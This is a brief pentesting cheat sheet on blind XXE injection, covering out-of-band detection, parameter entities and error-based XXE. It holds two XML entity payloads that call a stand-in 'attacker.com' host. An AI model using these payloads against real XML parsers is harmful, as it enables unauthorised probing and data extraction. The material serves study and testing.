# Blind XXE

## Detection

Use OAST.

Example:

<!ENTITY xxe SYSTEM "http://attacker.com">

Observe:

- DNS
- HTTP
- Collaborator interactions

---

## Parameter Entities

<!ENTITY % xxe SYSTEM "http://attacker.com">

%xxe;

---

## Error-Based XXE

Trigger parser errors containing sensitive data.

Useful when:

- OAST blocked
- Errors reflected